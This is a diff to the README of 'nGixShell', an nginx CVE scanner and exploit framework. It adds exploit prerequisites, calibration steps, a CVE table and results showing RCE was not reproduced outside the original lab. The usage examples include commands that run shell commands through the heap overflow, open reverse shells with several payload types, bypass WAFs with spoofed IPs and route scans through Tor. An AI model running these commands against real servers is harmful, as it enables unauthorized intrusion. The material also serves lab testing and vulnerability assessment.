@@ -5,7 +5,7 @@
 <div align="center">
 
 ![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square&logo=python&logoColor=white)
-![CVEs](https://img.shields.io/badge/CVEs-53-critical?style=flat-square)
+![CVEs](https://img.shields.io/badge/CVEs-53-blue?style=flat-square)
 ![Zero deps](https://img.shields.io/badge/dependencies-none-brightgreen?style=flat-square)
 ![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
 
@@ -13,26 +13,34 @@
 
 ---
 
-**nGixShell** is an nginx CVE scanner and RCE exploit framework. It ships a working proof-of-concept for **CVE-2026-42945** — a critical heap buffer overflow in `ngx_http_rewrite_module` — and a scanner covering **53 nginx CVEs** with automated HTTP probes, fingerprinting, WAF detection/bypass, web security auditing, and report generation.
+**nGixShell** is an nginx CVE scanner and RCE exploit framework. It ships a proof-of-concept for **CVE-2026-42945** (CVSS 3.1 **8.1 HIGH** per F5/NVD) — a heap buffer overflow in `ngx_http_rewrite_module` — and a scanner covering **53 nginx CVEs** with automated HTTP probes, fingerprinting, WAF detection/bypass, web security auditing, and report generation.
 
 Zero external dependencies. Pure Python 3 stdlib.
+
+> **Exploit prerequisites (read first).** `--cmd` / `--shell` only work when **all** of
+> these are true: the target is **x86_64**, the vulnerable `rewrite`+`set` config is
+> present, **ASLR is disabled**, and the heap/libc addresses were **calibrated for
+> that exact build** (`calibrate.py` → `--build-file`). See
+> [Exploit Requirements](#exploit-requirements-read-first). The scanner itself has
+> no such requirements.
 
 ---
 
 ## Quick Start
 
 ```bash
-# Spin up the vulnerable lab
+# Spin up the vulnerable lab (nginx 1.25.3, ASLR disabled in the container)
 docker compose -f env/docker-compose.yml up -d
 
-# Auto mode — fingerprint + CVE scan + web audit
+# Auto mode — fingerprint + CVE scan + web audit (works on any arch)
 python3 ngixshell.py 127.0.0.1:19321
 
-# Execute a command via RCE (CVE-2026-42945)
-python3 ngixshell.py 127.0.0.1:19321 --cmd 'id'
+# RCE — calibrate first, then exploit (x86_64 host + ASLR off required)
+sudo python3 calibrate.py 127.0.0.1 19321 <worker_pid> --json -o profile.json
+python3 ngixshell.py 127.0.0.1:19321 --cmd 'echo pwned > /tmp/pwned' --build-file profile.json
 
 # Drop a reverse shell (IP auto-detected)
-python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell
+python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell --build-file profile.json
 
 # Detect and bypass WAF, then scan
 python3 ngixshell.py 127.0.0.1:19321 --waf-bypass
@@ -40,12 +48,16 @@ python3 ngixshell.py 127.0.0.1:19321 --waf-bypass
 # Subdomain scan
 python3 ngixshell.py --subdomain-scan example.com --scan-port 443
 
-# Multiple targets from a file
+# Multiple targets from a file (one report per target)
 python3 ngixshell.py --target-file hosts.txt --json --html-report results.html
 ```
 
 No flags required — pointing the tool at a target runs everything automatically.  
 TLS is **auto-detected**. nginx is fingerprinted even with `server_tokens off`.
+
+> `system()` does not capture stdout: `--cmd 'id'` runs but prints nothing back.
+> Use a command with an observable side effect and confirm it with
+> `--verify-url http://target/pwned` (HTTP 200 = confirmed).
 
 ---
 
@@ -71,12 +83,25 @@ TARGET formats:
 | `--shell` | Pop a reverse shell |
 | `--shell-type TYPE` | Payload: `bash` `python` `perl` `php` `nc` `powershell` (default: `python`) |
 | `--upgrade-shell` | Auto-send PTY upgrade after shell connects |
+| `--verify-url URL` | After a detected crash, fetch URL to confirm the command ran (200 = verified) |
 | `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
 | `--cve CVE-ID` | Test one specific CVE |
 | `--list-cves` | Print all 53 CVEs with CVSS and probe info |
 | `--list-candidates` | Print heap address candidates |
 | `--dry-run` | Fingerprint + scan only, no exploit |
 | `--target-file FILE` | Scan multiple hosts from a file |
+
+### Exploit tuning
+
+| Flag | Description |
+|---|---|
+| `--build-file FILE` | **Recommended.** JSON calibration profile from `calibrate.py --json -o FILE` |
+| `--offsets SPEC` | Comma-separated hex heap offsets from `calibrate.py` (e.g. `0x5a427,0x60e67`) |
+| `--heap-base HEX` / `--libc-base HEX` / `--system-addr HEX` | Manual address overrides |
+| `--build KEY` | Built-in profile (**only** the DepthFirst lab reference is shipped) |
+| `--rewrite-path PATH` | Vulnerable `rewrite` location (default `/api`) |
+| `--spray-path PATH` | `proxy_pass`-backed location used for the POST-body spray (default `/upload`) |
+| `--tries N` / `--spray N` / `--body-len N` | Trigger attempts per candidate / spray connections / spray body size |
 
 ### WAF Detection & Bypass
 
@@ -146,27 +171,33 @@ Runs automatically in scan mode. All modules can be skipped individually.
 | Flag | Description |
 |---|---|
 | `--output FILE` | Write log to FILE |
-| `--json` | Print JSON summary at end |
-| `--html-report [FILE]` | Generate HTML report (default: `ngixshell_<host>_<ts>.html`) |
+| `--json` | Print JSON summary at end (multi-target: `{"targets": [...]}`) |
+| `--html-report [FILE]` | Generate HTML report (one file per target in multi-target mode) |
 | `--verbose` | Debug output |
+
+**Exit codes:** `0` — no findings / exploit verified; `1` — findings present, no
+crash, or execution error. Intended for CI gating. `--cmd` without `--verify-url`
+returns `0` on a detected worker crash, which only proves the overflow reached the
+pool cleanup pointer — not that code executed.
 
 ---
 
 ## CVE Coverage
 
-53 entries spanning 2009–2026. Sorted by CVSS.
+53 entries spanning 2009–2026. Scores reflect CVSS v3.1 base metrics from
+NVD/F5 advisories at the time of writing (verify before relying on them for triage).
 
 | CVE | CVSS | Component | Description |
 |---|---|---|---|
-| CVE-2026-42945 | 9.8 CRITICAL | rewrite | Heap overflow → RCE (**exploited**) |
-| CVE-2026-42946 | 8.1 HIGH | rewrite | Memory corruption (same advisory) |
+| CVE-2026-42945 | 8.1 HIGH | rewrite | Heap overflow → RCE with ASLR off (**exploited**) |
+| CVE-2026-42946 | 6.5 MEDIUM | scgi/uwsgi | Excessive memory allocation / over-read |
 | CVE-2022-41741 | 7.8 HIGH | mp4 | Memory corruption via malicious mp4 |
 | CVE-2016-1247 | 7.8 HIGH | packaging | Log file symlink privilege escalation |
 | CVE-2021-23017 | 7.7 HIGH | resolver | Off-by-one heap overwrite |
-| CVE-2026-40701 | 7.5 HIGH | request | Memory corruption in request processing |
-| CVE-2026-42934 | 7.5 HIGH | request | Memory corruption (same advisory) |
-| CVE-2026-27784 | 7.5 HIGH | mp4 | Buffer overflow via crafted mp4 |
-| CVE-2026-32647 | 7.5 HIGH | mp4 | Buffer overflow (sibling of above) |
+| CVE-2026-40701 | 4.8 MEDIUM | SSL | ssl_verify_client + ssl_ocsp flaw |
+| CVE-2026-42934 | 4.8 MEDIUM | charset | charset/charset_map + unbuffered proxy_pass |
+| CVE-2026-27784 | 7.8 HIGH | mp4 | Buffer over-read/over-write (32-bit builds) |
+| CVE-2026-32647 | 7.8 HIGH | mp4 | Buffer over-read/over-write |
 | CVE-2024-24990 | 7.5 HIGH | HTTP/3 | Use-after-free in QUIC module |
 | CVE-2024-24989 | 7.5 HIGH | HTTP/3 | NULL pointer dereference in QUIC |
 | CVE-2024-31079 | 7.5 HIGH | HTTP/3 | Stack overflow in QUIC encoder |
@@ -181,17 +212,17 @@ Runs automatically in scan mode. All modules can be skipped individually.
 | CVE-2012-1180 | 7.5 HIGH | proxy | Use-after-free in proxy module |
 | CVE-2009-3555 | 7.5 HIGH | SSL | TLS renegotiation injection (MITM) |
 | CVE-2009-2629 | 7.5 HIGH | core | Buffer underflow in URI parsing |
-| CVE-2026-42926 | 6.5 MEDIUM | HTTP/2 | Request splitting via proxy |
-| CVE-2026-27654 | 6.5 MEDIUM | WebDAV | Heap overflow in DAV module |
-| CVE-2026-28753 | 6.5 MEDIUM | mail | Header injection in mail proxy |
-| CVE-2026-1642 | 6.5 MEDIUM | proxy | SSL upstream session reuse leak |
+| CVE-2026-42926 | 5.8 MEDIUM | HTTP/2 | Frame-header injection (proxy_set_body) |
+| CVE-2026-27654 | 8.2 HIGH | WebDAV | Heap overflow in DAV module |
+| CVE-2026-28753 | 3.7 LOW | mail | CRLF injection via DNS responses (SMTP) |
+| CVE-2026-1642 | 5.9 MEDIUM | proxy | SSL upstream session reuse leak |
 | CVE-2019-9511 | 6.5 MEDIUM | HTTP/2 | Data Dribble CPU/memory DoS |
 | CVE-2012-2089 | 6.8 MEDIUM | mp4 | Buffer overflow via mp4 request |
 | CVE-2018-16845 | 5.5 MEDIUM | mp4 | Integer underflow → crash + disclosure |
 | CVE-2019-20372 | 5.3 MEDIUM | proxy | HTTP request smuggling |
-| CVE-2026-40460 | 5.3 MEDIUM | HTTP/3 | QUIC connection spoofing |
-| CVE-2026-28755 | 5.3 MEDIUM | SSL | Memory disclosure in OCSP processing |
-| CVE-2025-23419 | 5.3 MEDIUM | SSL | TLS session resumption cert bypass |
+| CVE-2026-40460 | 6.5 MEDIUM | HTTP/3 | QUIC connection spoofing |
+| CVE-2026-28755 | 5.4 MEDIUM | stream SSL | Revoked-cert handling (OCSP) |
+| CVE-2025-23419 | 4.3 MEDIUM | SSL | TLS session resumption cert bypass |
 | CVE-2024-35200 | 5.3 MEDIUM | HTTP/3 | NULL pointer dereference |
 | CVE-2024-34161 | 5.3 MEDIUM | HTTP/3 | Memory disclosure |
 | CVE-2016-4450 | 5.3 MEDIUM | core | NULL pointer via chunked request body |
@@ -202,9 +233,9 @@ Runs automatically in scan mode. All modules can be skipped individually.
 | CVE-2011-4963 | 5.0 MEDIUM | access | IPv6 literal access control bypass |
 | CVE-2011-4315 | 5.0 MEDIUM | resolver | Heap overflow via crafted DNS response |
 | CVE-2009-3896 | 5.0 MEDIUM | core | NULL pointer dereference DoS |
-| CVE-2025-53859 | 4.3 MEDIUM | mail | SMTP command injection |
+| CVE-2025-53859 | 3.7 LOW | mail | SMTP command injection |
 | CVE-2014-3616 | 4.3 MEDIUM | SSL | TLS SNI virtual host confusion |
-| CVE-2026-27651 | 4.3 MEDIUM | mail | NULL pointer dereference in mail proxy |
+| CVE-2026-27651 | 7.5 HIGH | mail | Worker termination (auth_http) |
 | CVE-2019-9513 | 4.3 MEDIUM | HTTP/2 | Resource Loop CPU DoS |
 | CVE-2019-9516 | 4.3 MEDIUM | HTTP/2 | 0-Length Headers memory exhaustion |
 | CVE-2018-16843 | 4.3 MEDIUM | HTTP/2 | Excessive memory consumption |
@@ -230,26 +261,73 @@ The copy overflows the undersized heap buffer with attacker-controlled URI data.
 | NGINX Open Source | 0.6.27 – 1.30.0 | 1.31.0, 1.30.1 |
 | NGINX Plus | R32 – R36 | R36 P4, R35 P2, R32 P6 |
 
-Vendor advisory: <https://my.f5.com/manage/s/article/K000160932>
+Vendor advisory: <https://my.f5.com/manage/s/article/K000161019>  
+Reference research & exploit: <https://github.com/DepthFirstDisclosures/Nginx-Rift>
+
+---
+
+## Exploit Requirements (read first)
+
+The RCE primitive corrupts `ngx_pool_t` cleanup pointers and needs deterministic
+heap addresses. **All** of the following are mandatory — the tool warns and
+aborts when they are not met:
+
+1. **x86_64 target.** arm64 heap addresses (`0xaaaa…`) always contain bytes that
+   nginx's `NGX_ESCAPE_ARGS` encoder rewrites, so no candidate address survives
+   the URI filter (`calibrate.py` then reports "no URL-safe offsets").
+2. **Vulnerable config.** A `rewrite` whose replacement contains `?`, followed
+   by `set`/`if`/`rewrite` using an unnamed capture, e.g.
+   `rewrite ^/api/(.*)$ /internal?migrated=true; set $x $1;` — plus a
+   `proxy_pass`-backed location used for the POST-body spray.
+3. **ASLR disabled** on the target (`kernel.randomize_va_space=0`, container
+   started with `setarch -R`, etc.).
+4. **Per-build calibration.** Heap base, libc base and pool offsets differ per
+   nginx build, libc (glibc/musl), distro and config. Only the DepthFirst
+   reference profile ships built-in; for anything else:
+
+   ```bash
+   sudo python3 calibrate.py <host> <port> <worker_pid> --spray-path /spray \
+       --spray-mode full --json -o profile.json
+   python3 ngixshell.py <host> --cmd 'touch /tmp/pwned' --build-file profile.json \
+       --continue-on-crash --verify-url http://<host>/pwned.txt
+   ```
+
+   The heap feng-shui is build-specific: the original PoC was calibrated (and
+   only demonstrated) against its own lab — Ubuntu jammy, nginx compiled from
+   source at `98fc3bb`, glibc 2.35. See [Validation status](#validation-status).
+
+`--cmd` runs through `system()`, so stdout is **not** captured. Always confirm
+with a verifiable side effect (`--verify-url`) — a detected worker crash alone
+proves the overflow reached the cleanup pointer, not that code executed.
 
 ---
 
 ## Lab Setup
 
-Tested on Ubuntu 24.04 LTS. Requires Docker and Python 3.8+.
+The bundled lab is an intentionally vulnerable nginx 1.25.3 with the
+`rewrite`+`set` trigger, a spray location, and `setarch -R` (ASLR off) wired in
+`env/entrypoint.sh` (needs `seccomp=unconfined`, already set in the compose
+file).
+
+Tested on Ubuntu 24.04 LTS (x86_64). Requires Docker and Python 3.8+.
 
 ```bash
-# Start the vulnerable lab (nginx 1.25.3)
+# Start the vulnerable lab
 docker compose -f env/docker-compose.yml up -d
 
-# Full scan
+# Full scan (works on any architecture)
 python3 ngixshell.py 127.0.0.1:19321
 
-# RCE with JSON output
-python3 ngixshell.py 127.0.0.1:19321 --cmd 'id' --json
+# RCE (x86_64 host only; calibrate the worker first)
+W=$(pgrep -f 'nginx: worker' | head -1)
+sudo python3 calibrate.py 127.0.0.1 19321 "$W" --json -o profile.json
+python3 ngixshell.py 127.0.0.1:19321 --cmd 'echo pwned > /tmp/pwned' \
+    --build-file profile.json
+docker compose -f env/docker-compose.yml exec nginx-vuln cat /tmp/pwned
 
 # Reverse shell — bash payload, PTY auto-upgrade
-python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell
+python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash \
+    --upgrade-shell --build-file profile.json
 
 # WAF bypass scan with spoofed IP
 python3 ngixshell.py 127.0.0.1:19321 --waf-bypass --waf-ip 10.10.10.1
@@ -260,9 +338,43 @@ python3 ngixshell.py 192.168.1.10 --proxy socks5://127.0.0.1:9050
 # Subdomain scan with rate limiting
 python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --rate-limit 10
 
-# Multiple targets, JSON output, HTML report
+# Multiple targets, JSON output, HTML report (one report per target)
 python3 ngixshell.py --target-file hosts.txt --json --html-report results.html
 ```
+
+---
+
+## Validation status
+
+Run the suite yourself (no dependencies, uses local fixtures):
+
+```bash
+python3 test_validation.py
+```
+
+Validated on 2026-09-24 (`test_validation.py`, 38 checks):
+
+| Area | Result |
+|---|---|
+| Scanner / fingerprint / CVE probes / web audit / stub_status / vhosts | PASS |
+| WAF detection + bypass headers/path obfuscation | PASS |
+| HTTP CONNECT and SOCKS5 proxies, TLS audit (cert decode, expiry, protocols) | PASS |
+| JSON/HTML reports, multi-target reports, HTML escaping | PASS |
+| Error handling (`--build-file` missing, bad offsets), dry-run, exit codes | PASS |
+| CVE-2026-42945 trigger (worker crash on vulnerable config) | CONFIRMED |
+| RCE (`--cmd`/`--shell`) | NOT REPRODUCED outside the original DepthFirst lab |
+
+RCE notes: reproduction attempts were made on Ubuntu 24.04 (glibc 2.39) and on
+a byte-pinned Ubuntu 22.04 image built with the vendor's own Dockerfile
+(snapshot apt packages, gcc 11.2, glibc 2.35, nginx `98fc3bb`), each with
+ASLR disabled and profiles generated by `calibrate.py`. In every case the
+overflow reliably crashed the worker, but no candidate executed a command —
+including with `libc_base`/`system()` matching the vendor's PoC exactly. The
+missing ingredient is the vendor's exact heap feng-shui (initial heap base and
+pool alignment), which also depends on the host kernel. Treat `--cmd` output as
+unverified unless `--verify-url`/side effects confirm it, and never treat a
+crash as RCE. If you need the full RCE, reproduce the vendor's environment
+bit-for-bit (`DepthFirstDisclosures/Nginx-Rift`) and use its `poc.py`.
 
 ---
 
